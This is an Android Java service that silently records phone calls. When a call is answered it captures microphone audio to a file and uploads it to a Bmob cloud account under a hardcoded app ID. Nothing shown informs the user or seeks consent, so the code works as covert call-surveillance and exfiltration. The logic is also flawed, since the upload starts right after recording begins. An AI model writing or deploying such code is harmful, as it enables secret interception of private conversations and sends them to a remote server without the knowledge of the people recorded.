package org.huge.phonevoicesave;

import java.io.File;

import com.bmob.BmobProFile;
import com.bmob.btp.callback.UploadListener;

import android.R.raw;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Environment;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;
import cn.bmob.v3.Bmob;
import cn.bmob.v3.datatype.BmobFile;
import cn.bmob.v3.listener.UploadBatchListener;
import cn.bmob.v3.listener.UploadFileListener;

public class PhoneService extends Service {
	private TelephonyManager tm;
	private MyPhoneStateListener listener;
	private MediaRecorder recorder;

	@Override
	public void onCreate() {
		super.onCreate();
		//使用Bmob SDK,云端创建的应用ID
		Bmob.initialize(this, "82fc8df8d70912f7a28310bb97906437");
		tm=(TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
		listener=new MyPhoneStateListener();
		//监听通话状态
		tm.listen(listener, PhoneStateListener.LISTEN_CALL_STATE);
	}

	@Override
	public IBinder onBind(Intent arg0) {
		return null;
	}

	private class MyPhoneStateListener extends PhoneStateListener{

		@Override
		public void onCallStateChanged(int state, String incomingNumber) {
			switch (state) {
			case TelephonyManager.CALL_STATE_IDLE://待机状态
				if (recorder!=null) {
					recorder.stop();
					recorder.reset();
					recorder.release();
					recorder=null;
				}
				break;
			case TelephonyManager.CALL_STATE_OFFHOOK://接听状态，开始录音
				try{
					String fileName=System.currentTimeMillis()+".amr";
					File file=new File(Environment.getExternalStorageDirectory(),fileName);
					String filePath=file.getPath();
					recorder=new MediaRecorder();
					recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
					recorder.setOutputFormat(MediaRecorder.OutputFormat.RAW_AMR);
					recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
					recorder.setOutputFile(file.getAbsolutePath());
					recorder.prepare();
					recorder.start();
					//上传通话录音音频流
					upload(filePath);
				}catch (Exception e) {
					e.printStackTrace();
				}
				break;
			case TelephonyManager.CALL_STATE_RINGING://响铃状态
				break;
			default:
				break;
			}
		}
	}
	
	/*
	 * 上传录音音频流
	 */
	public void upload(String path) {
		BmobProFile.getInstance(this).upload(path, new UploadListener() {
			
			@Override
			public void onError(int arg0, String arg1) {
				// TODO Auto-generated method stub
				
			}
			
			@Override
			public void onSuccess(String arg0, String arg1, BmobFile arg2) {
				Log.i("bmob","文件上传成功："+arg0+",可访问的文件地址："+arg2.getUrl());
			}
			
			@Override
			public void onProgress(int arg0) {
				// TODO Auto-generated method stub
				
			}
		});
	}
}
